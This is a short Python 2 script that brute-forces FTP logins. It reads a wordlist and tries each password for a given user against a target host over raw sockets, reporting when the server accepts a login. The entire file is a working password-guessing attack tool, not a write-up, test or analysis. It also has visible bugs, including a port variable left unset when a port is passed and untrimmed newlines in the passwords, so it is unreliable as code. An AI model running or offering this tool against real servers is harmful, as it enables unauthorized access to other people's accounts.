#!/usr/share/python
# -*- coding: utf-8 -*-

import socket
import sys
import re
import argparse

info = '''
Usage : ./bruteForce.py [options]\n
Options: -u, --user      <user>          |   User\n
         -t, --target    <hostname/ip>   |   Target\n
         -p, --port      <port>          |   Port\n
         -w, --wordlist  <wordlist>      |   Wordlist\n
         -h, --help                      |   Help\n
'''


def help():
    print info
    sys.exit(1)


def connectFTP(target, user, passwd, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.recv(1024)

        print "Send User: " + user + " "
        s.send("USER " + user + "\r\n")
        s.recv(1024)
        
        print "Send Pass: " + passwd + "\n"
        s.send("PASS " + passwd + "\r\n")

        answ = s.recv(1024)
        s.send("QUIT\r\n")
        if re.search('230', answ):
            print "Login OK: " + passwd
            sys.exit(1)
    except:
        pass


def bruteForce(user, target, wl, port):
    try:
        wordlist = open(wl, "r")
        words = wordlist.readlines()
        print "[-] Initializing FTP connection on IP - " + target + " [-] \n"
        print "[-] Loading WL - " + wl + "...\n"

        for word in words:
            connectFTP(target, user, word, port)
    except:
        print "Error: " + str(sys.exc_info()[1])
        sys.exit(1)


parser = argparse.ArgumentParser()
parser.add_argument("-u", "--user", help="User")
parser.add_argument("-t", "--target", help="Target")
parser.add_argument("-p", "--port", help="Port")
parser.add_argument("-w", "--wordlist", help="Wordlist")

args = parser.parse_args()

# if args is not used then print
if len(sys.argv) == 1 or args.user is None or args.target is None or args.wordlist is None:
    help()
    sys.exit(1)

if args.port is None:
    port = 21

target = args.target
user = args.user
wordlist = args.wordlist

bruteForce(user, target, wordlist, port)
print "[-] Brute Force was over. \n"
